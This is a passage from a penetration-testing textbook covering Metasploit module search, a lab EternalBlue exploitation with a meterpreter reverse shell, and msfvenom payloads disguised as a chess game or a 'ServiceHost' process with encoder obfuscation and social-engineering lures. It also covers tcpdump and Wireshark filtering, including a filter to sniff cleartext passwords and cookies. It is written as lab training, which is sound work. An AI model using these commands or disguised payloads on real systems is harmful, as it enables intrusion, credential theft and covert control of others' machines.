## Page 318

msf5 > search
Although you can use the search function to search for keywords in a
module name, that approach is not always efficient as it will often return a
VERY large result set.
To be more specific in your search, you can use the following syntax.
platform -
this is the operating system that this module is designed for
type -
this is the type of module. For instance, type:exploit
name or keyword -
the name of the module or keyword in its description
The syntax for using search is the keyword; followed by a colon; and then a
value, such as; msf5 > search type:exploit
For instance, if you were looking for a module to exploit (type) Abobe
Flash (keyword) on Windows (platform) you could display all the exploit
modules to do so by entering;

## Page 319

msf5 > search type:exploit platform:windows flash
As you can see above, Metasploit searched its database for modules that are
exploits for
the Windows platform and included the keyword " flash " and found and
displayed all 30.
Although this is less than an exhaustive list of Metasploit commands, with
just these commands, you should be able to execute most of the functions in
Metasploit. When you need another command in this course, I will take a
few minutes to introduce it, but these are all you will likely need, for now.
Metasploit Directory Structure
150 | P a g e

## Page 320

When I first started with Metasploit, I found it to be rather opaque and
difficult to decipher. It seemed like a black box. Only when I became
familiar with the directory structure behind the interactive interface
(msfconsole), did I begin to look inside the black box and suddenly a light
went on! I will try to shine that same light here in the hope that it will help
you better understand Metasploit.
Let’s begin to look inside Metasploit by opening terminal and navigating to
the
/usr/share/metasploit-framework directory.
kali > cd /usr/share/metasploit-framework
kali > ls –l

## Page 321

Now, change directories to modules directory.
kali > cd modules
151 | P a g e
As you can see, within the modules are the seven types of modules we saw
earlier. We can delve even deeper by changing directories to the exploits
subdirectory and next the windows subdirectory.
kali > cd exploits

## Page 322

kali > ls -l
Now we can see that the exploits categorized into directories for a particular
platform (in general, platform is equivalent to operating system with a few
exceptions such firefox, netware and a few others).
If we were looking to exploit a windows system, we would want a
Windows exploit, so let’s navigate to that sub-directory.
kali > cd windows
kali > ls –l
152 | P a g e

## Page 323

You can see here that there are numerous directories from “antivirus” to
“wins.”
Finally, let’s take a look inside the “smb” directory
kali > cd smb

## Page 324

kali > ls –l
153 | P a g e
Here Metasploit has all the exploits that can attack the SMB protocol (for
more on the SMB protocol, see
https://www.hackers-arise.com/single-post/2019/03/04/Network-Basics-for-
Hackers-Server-Message-
Block-SMB ). Note that each module ends in .rb meaning its code is written
in Ruby. Also, I have pointed out the EternalBlue exploit within Metasploit.
We know that our Windows 7 system is vulnerable to EternalBlue from our
vulnerability assessment in Chapter 7.
I hope this brief exploration of the directory structure of Metasploit shed
some light on the inner workings on this powerful tool and help you find

## Page 325

the module you need. Also, later in this chapter we will add a module to our
Metasploit framework and we will need to know where to place it.
A Word About Exploitation Success
Hacking, or exploitation, is NOT simply choosing an exploit and “throwing
it against a system” and…
Voila!...you are inside the system (although I wouldn’t blame you for
believing that based upon the millions of YouTube videos that depict
hacking that way). Hacking is a process; sometimes a tedious process. Even
when you have selected the right exploit, it still doesn’t work.
If I depicted hacking as easy and always successful, I would be doing you a
disservice. Often hacks fail.
You are trying to make a system do something it was NOT supposed to do.
In some cases, you are
breaking a service or system to gain access. This is very unlike the work of
a system or network administrator who is trying to get the system to work
as it was intended to work.
If you run into difficulty performing the hacks I display in this book,
consider it a reflection of the real world. Hacking is not easy or always
successful. As I point out in Chapter 2, two of the key qualities of hackers
are persistence and creativity .
154 | P a g e

## Page 326

Having said all that, Metasploit exploits are well tested to work against the
systems they are targeting.
Even with that, they do NOT always work. To illustrate this point, enter the
show exploits command again from the msfconsole.
msf5 > show exploits
You will see hundreds of exploits. Please note the 5th column. In this
column, the good folks at Rapid7
give us an indication of the probable success of the exploit module. These
rankings, in order of their likely success, are;
1. Excellent
2. Great
3. Good
4. Average
5. Manual
This means that if you use an exploit ranked “excellent”, it will likely work
90% of the time. Not 100%.

## Page 327

On the other hand, if you use a module ranked “manual” you can probably
expect it to be effective less than 40% of the time. The others work on
gradations between 90% and < 40%.
Reconnaissance with Metasploit
In chapters 5 and 6, we used quite a few tools to conduct reconnaissance on
our targets. Right now, we know quite a bit about our target including; its
open ports, services, technologies, operating system, browser and more.
Most of this information can also be garnered using auxiliary modules in
Metasploit.
Auxiliary modules in Metasploit are modules that don’t fit into any of the
other categories of modules.
Auxiliary-- in other words-- is a “grab bag” of modules.
Many of the auxiliary modules are reconnaissance tools, and there are many
scanners. Besides, this category has some password cracking tools,
vulnerability scanning tools, and many others.
155 | P a g e
For instance, to do port scanning similar to an nmap scan like we did in
Chapter 6, Metasploit has several modules in the auxiliary/scanner
directory. To find them, navigate to
/usr/share/metasploit-framework/modules/auxiliary/scanner/portscan and

## Page 328

do a long listing
kali > cd /usr/share/metasploit-
framework/modules/auxiliary/scanner/portscan
kali > ls -l
As you can see above, Metasploit has port scanning modules to perform an
ACK scan, SYN scan, a TCP
scan (that’s the same as a nmap –sT scan from Chapter 6) and an XMAS
scan (sending packets with the PUSH-URG-FIN flags set). For more on the
TCP flags, see www.hackers-arise/networks-basics.
Port Scanning with Metasploit
Let’s try doing a TCP portscan on our Windows 7 system with Metasploit
similar to what we did with nmap in Chapter 6.
From the msfconsole, we can search for that module.
msf5> search type:auxiliary tcp
When we hit enter, we can see that Metasploit has 39 exploits that meet that
criteria. If we scan up a bit, we can see number #28 is a TCP port scanner.
Let’s use that one.
msf5 > use auxiliary/scanner/portscan/tcp
156 | P a g e

## Page 329

To use this module to do a portscan of our Windows 7 system, we simply
need to set the IP address of our RHOSTS (remote hosts or our target
system) and enter run.
msf5 > set RHOSTS 192.169.0.114
msf5 > run
As you can see, the Metasploit port scanning module finds identical results
as our nmap scan in Chapter 6.
Vulnerability Scan with Metasploit

## Page 330

In addition to port scanners, Metasploit also has some vulnerability
scanners in the auxiliary modules. As we are focusing on the EternalBlue
exploit in this book, let’s see whether we can find a module for 157 | P a g e
vulnerability assessment in Metasploit. Generally, vulnerability scanners in
Metasploit are found among the auxiliary modules, so we can search by
type “auxiliary” and look for the keyword “eternalblue”.
msf5> search type:auxiliary eternalblue
As you can see above, our search found two modules that fit our criteria.
The second described as “MS17-010 SMB RCE Detection” is the one we
want here.
Let’s load it into our console and try using it against our Windows 7 system.

## Page 331

msf5 > use auxiliary/scanner/smb/smb_ms17_010
Now we have loaded it, let’s get some information on this module.
msf5 > info
Note in the description near the bottom, Metasploit describes this module
as;
158 | P a g e
“Uses information disclosure to determine if MS17-010 has been
patched or not.”
This is exactly what we need to know ! Let’s use it to see whether the
Windows 7 system is vulnerable to the EternalBlue exploit (yes, I know. We
did something similar in Chapter 7, but it’s always good to know multiple
ways to accomplish the same task in hacking).
msf5 > set RHOSTS 192.168.0.114
msf5 > exploit
As we suspected and confirmed in Chapter 7, our Windows 7 system is
vulnerable to the EternalBlue exploit!
Exploitation with Eternal Blue

## Page 332

Now with the information we have gathered throughout our reconnaissance
and vulnerability assessment, we are ready to exploit our Windows 7
system!
Let’s search for the proper exploit.
msf5 > search type:exploit eternalblue
We found the EternalBlue exploit for Windows 7!
Let’s load it into our console and see the info file.
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 > info
159 | P a g e

## Page 333

Note that this exploit only needs you to set the RHOSTS parameter
(variable) to use.
Next, let’s couple this exploit with a payload we can leave behind on the
system to control it after exploitation. To find payloads that will work with
this exploit, we can enter;

## Page 334

msf5 > show payloads
160 | P a g e
As you can see above, Metasploit displays 45 payloads that will work with
this exploit. Note #12, the windows/x64/meterpreter/reverse_http payload.
Let’s examine what its name implies.
windows/x64/meterpreter/reverse_http
windows -
This means it will work with Windows operating systems
x64 -
This means it will work with 64-bit operating systems
meterpreter - This means it places a special Metasploit payload named
“meterpreter” on the target reverse_http - This means the payload with call
back to us “reverse” over HTTP looking like normal HTTP traffic
To use this payload, we need to use the set command with the name of the
payload.
msf5 > set PAYLOAD windows/x64/meterpreter/reverse_http
Now, we need to set the IP addresses we will be using. The RHOSTS is the
remote host or the target system (Windows 7), and the LHOST is the local
host or our Kali system (you will need to use the ipconfig on Windows and
ifconfig on Kali Linux to obtain your IP addresses).

## Page 335

msf5 > set RHOSTS 192.168.0.114
msf5 > set LHOST 192.168.0.173
The final step is to enter the command “exploit” to run the exploit against
the Windows 7 system.
msf5 > exploit
161 | P a g e
As you can see, we were successful and received the meterpreter prompt!
meterpreter >
This means that we are inside the Windows 7 system. To make certain, let’s
enter the command sysinfo.

## Page 336

It should return the system information of the Windows 7 system if we are
inside.
meterpreter >sysinfo
As you can see here, this
command tells us we are inside a
computer with the following
attributes;
Computer
: OTW-PC
OS
:Windows 7 (Build 7600)
Architecture
: x64
System Language : en_US
Domain
: Workgroup
Logged On Users : 2
162 | P a g e

## Page 337


## Page 338

Meterpreter
: x64/windows
For further confirmation, let’s enter
ifconfig to find the IP address of the hacked
system.

## Page 339

meterpreter >ifconfig
Adding a New Exploit
Metasploit has almost 2000 exploits built-in.
These are NOT all the exploits available to
Metasploit. People all over the world port
exploits to Metasploit, not all of them make the
cut. In addition, Metasploit is updated
“weekish” (Rapid7’s term, not mine). When a
new exploit comes out, it may not be in
Metasploit until the next update or, for that
matter, never. Sometimes, you can’t wait that long. That’s when you need to
know how to add a module on your own.
For instance, on August 8, I went to exploit-db.com to search for new
Metasploit exploit modules. I entered “Metasploit” in the search field in the
upper right corner, exploit-db returns all the exploits with Metasploit in
their name, description or author. As you can see below, there was brand
new, 3-day old exploit for “Apache Tika 1.15-1.17 Header Command
Injection”. That exploit has not yet made its way into Metasploit.
When we click on it, we can scan the code for the info section to read what
it does .
163 | P a g e

## Page 340

If we wait for Rapid7 to update,

## Page 341

the target may be patched by then.
If you are not familiar with Apache Tika, here is a
We need to install and use it now!
description directly from its website.
To get this exploit into
The Apache Tika™ toolkit detects and extracts
Metasploit, I want to remind you
metadata and text from over a thousand different
of the section above on the
structure of Metasploit. To put a
file types (such as PPT, XLS, and PDF). All of these
new module into Metasploit, we
file types can be parsed through a single interface,
must know where to place it.
making Tika useful for search engine indexing,
Since this module is a Windows
content analysis, translation, and much more
exploit, we can begin by
navigating to;
kali > cd /usr/share/metasploit-framework/modules/exploits/windows

## Page 342

kali > ls –l
164 | P a g e
As we can see, we now need to further categorize this Windows exploit.
Although it doesn’t impact the proper functioning of the exploit, for
organization and ease of use, we need to place it in the proper category.
From reading the description of the exploit, the best place to put this exploit
would likely be a “fileformat exploit” (fileformat exploits take advantage of

## Page 343

a vulnerability in particular file type) as it uses a .jp file type to do
command injection. Now, move to the fileformat subdirectory.
kali > cd fileformat
Now, you can directly download the exploit the directory or download it
from another directory and move it here.
If you use the browser download, the new exploit will go to your
Downloads directory. Open another terminal and navigate to Downloads
directory.
Note that the new exploit has a number and not a name. We need to remedy
that AND move it to the proper directory for use with Metasploit.
We can do both these things with the mv command in Linux.
Simply use the mv command, followed by the filename, and then the target
directory, and new file name (tika.rb) such as;
165 | P a g e

## Page 344

kali > mv 47208.rb /usr/share/metasploit-
framework/modules/exploits/windows/fileformat/tika.rb
Now, when we navigate back to the Metasploit directories and do a long
listing on the fileformat directory. Our new exploit should be there.
Now, to get Metasploit to recognize our new module, we need to do one
final step. At the msfconsole prompt, enter reload_all;
This will reload all the modules from all module paths.
msf5 > reload_all
Now, to test whether your new module is available to Metasploit, let’s
search for it.
msf5 > search type:exploit platform:windows tika
Success! We added a new module to Metasploit and its ready for our use!
Creating a Malicious File with msfvenom
Metasploit has a special function to create malicious files that contain the
payload modules. In other words, this is how we might create a file that
includes a windows executable (.exe) file that when --
clicked and activated-- give us control of the target’s computer. Ideally, this
payload is the meterpreter 166 | P a g e

## Page 345

payload as it has maximum capability for post-exploitation capabilities
(web cam, microphone, upload and download files). We’ll do some post
exploitation with the Meterpreter in Chapter 11.
In Metasploit this function is called msfvenom. Msfvenom enables you to
embed a Metasploit payload into an otherwise innocent-looking file such as
a game or application. When the target clicks on the file, the payload will
trigger giving you the meterpreter prompt on their system. This can be
particularly useful in social engineering when you have physical access to
the system.
Let’s take a look at how msfvenom works for creating; first, a malicious file
that will execute a payload on the target system and then how to use it to
control a system when you have physical access.
Msfvenom
Msfvenom is a standalone payload generator that is capable of creating a
custom payload, embed it into a file and obscure its function from prying
eyes.
Msfvenom is relatively new to the Metasploit framework. Previously, one
had to use both the msfpayload and the msfencode functions in Metasploit
to create custom files and payloads. Now, all that can be done with a single
function, msfvenom.

## Page 346

Let’s begin by looking at some of the options in creating a custom
payload/malicious file with msfvenom by looking at the help screen.
kali > msfvenom –h
The key options in using msfvenom are;
-p
the Metasploit payload you want to use
-f
the format of the payload
167 | P a g e
-e
the encoder for obscuring the nature of the payload
-a
the architecture you are targeting (x86, x64, Linux, etc. default is x86)
-x
the template you want to use to embed the payload within
To better understand these options of msfvenom, we can use the –l (list)
switch with each option to view all of the possibilities. For instance, to see
all the format (-f) options we can enter;
kali > msfvenom –l format
168 | P a g e

## Page 347


## Page 348

As you can see in this screenshot, there are two types of msfvenom formats,
(1) Executable Formats and Transform Formats. The Executable Formats
will create an executable file of some type such as a
Windows .exe or a Linux .elf. Executable Formats are the type we will
focus on here. These create an executable file that--when opened--will
trigger a payload. Transform formats create a payload into a different
format such as C or Java. Transform Formats are used in creating your own
exploit (we’ll cover these in my upcoming book focusing just on
Metasploit, “Metasploit Basics for Hackers”).
To view the list of encoders for obscuring the nature of the payload, we can
enter;
169 | P a g e

## Page 349

kali > msfvenom –l encoders
These are ways that we can obscure the payload, so that even if the malware
is detected the analyst will not able to determine what it does. Note that
these encoders are ranked similar to the exploits, from excellent to manual.
The encoder x86/shikata_ga_nai is the only encoder rated “excellent.”
Shikata_ga_nai is so effective that it name in Japanese literally means, "
nothing can be done about it". Although some anti-virus applications can
detect malware encoded with shikata_ga_nai, in 2019 security researchers
were still finding malware launched by nation state hackers, encoded with
it.
Lastly, let’s view the platforms available for our custom payload. This
terminology here is the same as with the exploits. In general, it’s a synonym
for the operating system with a few exceptions (firefox, hardware, netware,
and few others).
kali > msfvenom –l platforms
170 | P a g e

## Page 350

Now, let’s get started creating a file that when
opened by the target will execute a payload giving us
complete control of their system!

## Page 351

The first thing we need to do is select our payload.
Let’s use the Windows meterpreter that
communicates over http, so that looks like normal
HTTP traffic
(windows/x86/meterpreter/reverse_http).
Note that we are using the 32-bit version (x86). We
are using the 32-bit version to make certain that it
can execute on any Windows system, 32-bit or 64-
bit.
Next, let’s decide to embed this payload inside a
chess game and make it a Windows .exe file. This
would enable us to send it to the target with some
rudimentary social engineering such as “Let’s play a
new online chess game. I have this great new 3-D
chess game!”.
Lastly, let’s obscure our payload with the encoder
shikata_ga_nai and run it through 10 iterations
of this encoder (more iterations make it more
obscure, but also make the file larger).
To create this malicious file, we would enter the

## Page 352

following;
kali > msfvenom –p windows/meterprete/reverse_http
LHOST=192.168.0.114
LPORT=80 –x /root/chess.exe –e x86/shikata_ga_nai –i 10 –f exe
>newchess.exe
171 | P a g e
When we look in our root directory, we should now find our file
newchess.exe with a size of 805 bytes.
As a final step, we need to prepare our system to accept the connection
from the target system when they execute the newchess.exe. We can do that
by executing what Metasploit calls its “multi handler.”
This is simply a listener that Metasploit uses to listen for the payload calling
back to the “mothership.” It will accept the connection and enable us to use
the Meterpreter on the target. Then we need to tell the multi handler what

## Page 353

type of payload to accept a connection (this must the same as the payload in
the above newchess.exe game) from and the LHOST and LPORT.
msf5> use multi/handler
msf5 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf5 > set LHOST 192.168.0.173
msf5 > set LPORT 80
For the final step, we need to execute the multi handler by entering the
command, exploit.
msf5 > exploit
The multi handler is now waiting on our system for the payload to call back
to us on port 80.
172 | P a g e
Now, when the target clicks on the chess game, it will execute the
meterpreter payload that will call back to our system and give us a
meterpreter shell on their system!
Using Msfvenom When We Have Physical Access
Msfvenom is great for creating custom malicious files that can be used with
social engineering (see Chapter 17), but it is also terrific for creating a
payload that can be used to control the target system when we have physical
access.
Let’s assume you are a spy and have been able to get access to the target’s
office and computer. It’s imperative for the survival of your nation’s
government that they find out what is on that computer!

## Page 354

With msfvenom, we can create a simple file that we can execute on the
target’s system that will give us complete control. This is even simpler than
creating a malicious file.
In this case, we only need to specify the payload with its LHOST and
LPORT, then the format (exe) and finally the name of the file we want to
create. Here, I have used the file name “ServiceHost”. This will help
obscure the nature of the process as it will have a name very similar to a
native process on a Windows system. Even if the target sees the process on
their system, unless they are relatively
sophisticated, they are unlikely to identify it as malicious.
msfvenom –p windows/meterpreter/reverse_http LHOST=192.168.0.114
LPORT=80 –f exe >ServiceHost.exe
Before we try to use this malware or malicious payload, we need to open a
listener on our Kali system in Metasploit. Open the interactive terminal in
Metasploit (msfconsole) and enter;
msf5 > use multi/handler
msf5 > set PAYLOAD windows/meterpreter/reverse_http
msf5> set LHOST <Your IP Address>
msf5> set LPORT 80
Now, we simply need to place this file on a flash drive, stick the flash drive
into the target system and execute it as Administrator (right click) to take
control!
173 | P a g e

## Page 355


## Page 356

Back on our Kali system, we should see the meterpreter prompt appear.
Then to assure ourselves we are on the target system, enter “sysinfo”.
Success! You now own that system!
Social Engineering with Metasploit

## Page 357

Metasploit has numerous modules that can be used in conjunction with
social engineering the target.
Above we looked at using msfvenom to embed a malicious payload inside a
chess game. We can also
embed malicious payloads into Word documents, PDF documents, MCL
link and web pages. For more on using Metasploit for social engineering,
skip to Chapter 17 Social Engineering
174 | P a g e
Summar y
Metasploit is a powerful, multi-function tool that is a requirement for any
aspiring hacker/pentester. It is designed for pentests and provides the
practioner with a bevy of tools and exploits. With addition of msfvenom,
the hacker/pentester can create malicious files with the meterpreter payload
hidden inside.
Exercises:
1. Scan for open ports on your unpatched Windows 7 system
2. Do a vulnerability scan using Metasploit for the EternalBlue vulnerability
3. Exploit your unpatched Windows 7 system with the EternalBlue exploit
4. Use msfvenom to create an executable file. Place that file on a flash
drive.
Take the flash drive to another computer on your network and execute it.
Check to see whether you get a meterpreter prompt on your Kali system.
175 | P a g e

## Page 358

1 0
Sniffers for Network and Protocol Analysis
A series of persistent, small wins will defeat any opponent.
Master OTW
A network sniffer—sometimes referred to as a packet
analyzer, protocol analyzer or network traffic analyzer —can
intercept and analyze network traffic that traverses a digital
network . These sniffers can be invaluable to the network or security

## Page 359

engineer, the forensic investigator--and in some cases--the hacker. For
instance, if an application sends passwords over the network
unencrypted, the hacker may be able to sniff and view the passwords.
176 | P a g e
Since only a few applications send passwords unencrypted in our security-
conscious era, the value of the sniffer to the hacker is a bit more nuanced.
For some exploits/hacks, such as DNS or MiTM attacks, analysis of the
LAN traffic can be crucial to their success, making the sniffer invaluable.
Besides, sniffing a target’s traffic can reveal what sites they are visiting,
their cookies, their user agent, or even their email messages (if unencrypted
or you have the resources to decrypt the message).
Many tools are capable of network sniffing, including:
1. SolarWinds Deep Packet Inspection and Analysis Tool
2. Tcpdump
3. Windump
4. Wireshark
5. Network Miner
6. Capsa
7. tshark
In this chapter, we use two of the most popular network sniffer/analyzers:
tcpdump and Wireshark . In addition, we use Wireshark to dig deep into
the NSA’s EternalBlue exploit to understand exactly how it works.
Controversial Use of Sniffers

## Page 360

For over twenty years, the Federal Bureau of Investigation (FBI) in the
United States has used a tool they term “Carnivore." This tool is used to
sniff and analyze the traffic of people suspected of committing crimes. It is
very controversial, but legal, as it allows the FBI to eavesdrop on network
traffic without a warrant.
Prerequisites to Sniffing
It's critical to point out that to effectively use a network sniffer, your
network interface card (NIC) should be in promiscuous mode. This means
that your NIC picks up ANY packet traversing the network.
Usually, NICs only pick up packets that are intended for its particular MAC
(globally unique physical) address.
The other critical point to understand with network sniffing is that the
standard file format for sniffing is
.pcap (packet capture). This means your system must have a library (a bit of
reusable code) to put the packets into this format. These libraries are
libpcap on your Linux system or Winpcap on your Windows system.
tcpdump in Action
Before we examine the powerful GUI-based snifferWireshark, let's take a
brief look at the command line sniffer, tcpdump. Tcpdump was among the
very first (1988) Linux/UNIX-based sniffers. Although it may not be the
easiest sniffer use, its versatility and lightweight design make it worth
knowing. Tcpdump can be particularly useful if you have to analyze a non-
GUI based system or a remote system where a GUI would be slow,
inefficient, and not very stealthy.
To start tcpdump, enter;
177 | P a g e

## Page 361

kali >tcpdump
As you can see, as soon as you enter the command tcpdump, packets begin
to flow across your screen.
These packets are largely communication between your Kali system and the
LAN gateway.
Let's try creating some traffic to analyze. For instance, let's try sending a
ping (ICMP echo request) to your Windows 7 system from one terminal and
run tcpdump from the other.
kali > ping 192.168.0.114
kali > tcpdump
Let’s zoom in on the tcpdump screen so we can see detail there.
178 | P a g e

## Page 362

As you can see, tcpdump displays the protocol (ICMP) and the type (echo
request and echo reply).
If we want to capture the output to a file that we can analyze it at a later
time, we can use the –w option followed by the file name, such as;.
kali > tcpdump –w myoutput.cap
Filter by IP Address
We may want to filter out all the traffic except the traffic coming back from
the Windows 7 system.
Tcpdump--developed by researchers at the Lawrence Livermore National
Laboratory in Berkeley, CA, running BSD (Berkley Software
Development) Unix--utilizes the Berkeley Packet Filter (BPF) format to
create filters.
We can create that filter for the Windows 7 IP address by entering:

## Page 363

kali > tcpdump host 192.168.0.114
Now you can see just the traffic coming and going to the Windows 7 system
as we have filtered out all the other traffic.
Now, let's connect to the Apache webserver on our Kali machine from your
Windows 7 system. First, start the Apache2 webserver built into Kali.
kali > systemctl apache2 start
This starts your Apache webserver. Next, start tcpdump again on your Kali
system.
179 | P a g e
kali > tcpdump host 192.168.0.114
Now, open a browser on your Windows 7 system and navigate to the Kali
system IP address.
You should begin to see packets appearing in the tcpdump terminal.

## Page 364

Note that we can see the three-way TCP handshake in the highlighted
polygon. You can see first an“S”
flag, then an “S.” flag (tcpdump represents the A or ACK flag with a “.”)
and then “.” Flag or written another way, S-SYN/ACK-ACK.
This filter displays traffic coming and going from our Windows 7 system.If
we want to filter for just the traffic coming FROM our Windows 7 system,
we can create a filter like;
kali > tcpdump src host 192.168.0.114
Now, we are only seeing the traffic coming (src) from our Windows 7
system (192.168.0.114).
Filter by Port
What if we wanted to filter out all the traffic except those going to a
particular port on our Apache webserver? Let’s try to filter out everything
except traffic going to port 80 (HTTP). If we use the –vv option (v ery v
erbose) in tcpdump, it will decode all the IP and TCP headers and the user
agent (the user agent can often be used to identify the user). To get these
results, we could write a filter such as: kali > tcpdump –vv dst port 80
180 | P a g e

## Page 365

As you can see above, tcpdump displays a significant amount of
information about the traffic including the browser’s user agaent (user
agents can be used to identify the user).
Filter by TCP Flags
What if we wanted to see only the traffic with SYN flags sets on it? We
could create a filter like this: kali > tcpdump ‘tcp[tcpflags]==tcp-syn’
Of course, we can create a filter for each of the TCP flags such as;
kali > tcpdump ‘tcp[tcpflags]==tcp-ack’
kali > tcpdump ‘tcp[tcpflags]==tcp-fin’
kali > tcpdump ‘tcp[tcpflags]==tcp-rst’
kali > tcpdump ‘tcp[tcpflags]==tcp-psh’
kali > tcpdump ‘tcp[tcpflags]==tcp-urg’
Combining Filters
Tcpdump enables us to use filters together using a logical AND (&&) or a
logical OR (||). So, if we wanted to filter for a particular IP address and TCP
port 80 we would create a filter such as:
kali > tcpdump host 192.168.0.114 and port 80
We can also use a logical OR, such as:
181 | P a g e

## Page 366

kali > tcpdump port 80 or port 443
If we wanted to see all the traffic except that travelling from a particular IP
address, we can use the negation symbol (!) or not.
kali > tcpdump not host 192.168.0.114
Filtering for Passwords and Identifying Artifacts
To filter for passwords in cleartext, we could build a filter for various ports
and then use egrep to search for strings indicating logins or passwords such
as;
kali > tcpdump port 80 or port 21 or port 25 or port 110 or port 143
or port 23 –lA | egrep –i B5
‘pass=|pwd=|log=|login=|user=|username=|pw=|passw=|password=’
If you want to filter for just the user agent (an identifying signature of the
user and their browser) we could create filter such as:
kali > tcpdump –vvAls | grep ‘User-Agent’
Finally, to filter for just the browser cookies, we can create the following
filter.
kali > tcpdump –vvAls | grep ‘Set-Cookie|Host|Cookie:’
tcpdump is a powerful command-line tool for analyzing network traffic
with multiple capabilities. Time invested in learning its BPF-based filtering

## Page 367

system is time well-invested. As a security admin or hacker, you may not
have access to a GUI on remote system and tcpdump is the tool of choice.
Wireshark, the Gold Standard in Sniffers
In recent years, Wireshark has become the de-facto standard in sniffers.
Formerly known as Ethereal, it is now part of every network or security
admin’s tool chest, or should be. Kali has Wireshark built-in, so we can start
Wireshark by simply entering Wireshark in the terminal or using the GUI;
go to Applications--
>Usual Applications->Internet-->Wireshark.
182 | P a g e

## Page 368


## Page 369

Wireshark now opens and ask you which interface you would like to listen
on. If you are using a VM, select the eth0. If you are using a physical
machine with a wireless adapter, select the wireless adapter (probably
wlan0). Usually, you can determine which adapter to select by the activity
level. The most active adapter is likely the one you want to use for sniffing.
183 | P a g e

## Page 370


## Page 371

Now, Wireshark begins capturing packets from your network interface and
packaging them into the .pcap format. Pcap is the standard file format for
packet capture (you find it used throughout our industry in such products as
Snort, aircrack-ng, and many others)
You see three separate analysis windows in Wireshark. The top window,
labeled #1 in the screenshot below, is known as the Packet List Pane . You
should see color-coded packets moving in real-time through this window.
The middle window, labeled #2 , is known as the Packet Details Pane .
This pane provides us with header information from the selected packet in
Window #1 .
Finally, Window #3 , Packet Bytes Pane , provides payload information in
both hexadecimal format to the left and ASCII format to the right.

## Page 372

Creating Filters in Wireshark
In general, there is way too much information here to do an effective
analysis. Packets are flying by, hundreds or thousands per minute. To use
Wireshark effectively, we need to filter the traffic to see only those packets
of interest . Wireshark has a simple filtering language that you should
understand to use it effectively and efficiently in any investigation or
analysis.
184 | P a g e

## Page 373

The packets flying by our interface are of many different protocols.
Probably the first filter we want to apply is a protocol filter. Remember,
TCP/IP is a suite of protocols, and we probably want to focus our analysis
to just a few.
In the filter window, type "tcp." You notice that it turns green, indicating
that your syntax is correct (it remains pink while your syntax is incorrect).
Now, click the arrow button to the far right of the filter window to apply the
filter.
When you do, Wireshark filters out all traffic, except the TCP traffic. You
can do the same for just about any protocol such as “http,”“smtp,”
"udp,”“dns," and many others. Try out a few and see what kind of traffic is
passing your interface.
If we want to see traffic only from a particular IP address, we can create a
filter that only shows traffic coming or going from that address. We can do
that by entering into the filter window:
ip.addr==<IP address>
Note the double equal sign (==) in the Wireshark filter syntax (similar to C
assignment operator). A single “=” does not work in this syntax.
In my case here, I want to see traffic coming or going to IP address
192.168.1.107, so I create a filter like so:
ip.addr == 192.168.1.107
185 | P a g e

## Page 374


## Page 375

Now, you see only traffic coming or going to that IP address. Now my
analysis and focus is narrowed to a single IP address of interest.
We can also filter traffic by port. If I want to see only TCP traffic destined
for port 80, I can create a filter like that below;
tcp.dstport==80
Note that this filter indicated the protocol (tcp), the direction (dst) and the
port (80).

## Page 376

When creating filters, we most often use “==” as the operator in our filter
(there are others see below).
This syntax works fine as long as we are looking for one of the many
header fields in the protocol. If we are looking for strings in the payload, we
have to use the "contains" operator. So, if I were looking for packets with
the word “Facebook” in them, we could create a filter like that below.
tcp contains facebook
186 | P a g e

## Page 377


## Page 378

As you can see above, it only found two packets with the word Facebook in
the payload, and we can see the word Facebook in the ASCII display in the
#3 pane.
Creating Filters with the Expression Window
If we aren't sure what field we want to filter for or how to create the
necessary filter, we can click on the Expression tab to the far right. This
opens the Expression window like below.
187 | P a g e
To the left of this window is the long list of fields available to us to create
filters. These are hundreds of protocols and the protocols’ fields. You can
expand a protocol and find all of its fields and select the field of interest.
The upper right-hand window includes the Relation choices. These include:
Operator
